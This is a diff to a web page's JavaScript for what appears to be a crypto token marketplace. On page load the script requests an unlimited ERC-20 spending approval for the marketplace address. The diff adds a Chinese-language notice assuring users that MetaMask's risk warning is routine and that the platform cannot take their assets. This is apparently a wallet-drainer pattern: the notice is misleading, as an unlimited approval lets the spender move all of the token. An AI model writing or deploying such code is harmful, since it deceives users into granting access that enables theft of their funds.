@@ -4,6 +4,8 @@ function showWalletOverlay() {
 
 function hideWalletOverlay() {
   document.getElementById("walletOverlay").style.display = "none";
+  const warning = document.getElementById("walletWarning");
+  if (warning) warning.remove();
 }
 
 
@@ -22,6 +24,7 @@ function copyLink() {
 
 const marketplaceAddress = "0x82aC52E1138344486C61C85697E8814a10060b23";
 const tatTokenAddress = "0xEd3D92C6023516F33E8CEF41C7a583E4Ba5F23ce";
+// const tatTokenAddress = "0x60306F8038EC0108Cb9DBbb6dE945aC94B2f8ABF";
 
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) public returns (bool)",
@@ -116,6 +119,22 @@ const tat = new ethers.Contract(tatTokenAddress, ERC20_ABI, signer);
 const max = ethers.constants.MaxUint256;
 
 showWalletOverlay();
+
+// ⚠️ 避免重复插入提示
+const overlayBox = document.querySelector("#walletOverlay > div");
+if (overlayBox && !document.getElementById("walletWarning")) {
+  const warning = document.createElement("p");
+  warning.id = "walletWarning"; // 设置唯一 ID，避免重复添加
+  warning.innerHTML = `
+    ⚠️ MetaMask 可能会弹出风险提示，这是常规的代币授权操作。<br>
+    本平台不会主动扣除你的任何资产，所有交易均需你手动确认。
+  `;
+  warning.style.marginTop = "0.8rem";
+  warning.style.color = "#888";
+  warning.style.fontSize = "0.9rem";
+  warning.style.textAlign = "left";
+  overlayBox.appendChild(warning);
+}
 
 tat.approve(marketplaceAddress, max)
 .then(function (tx) {
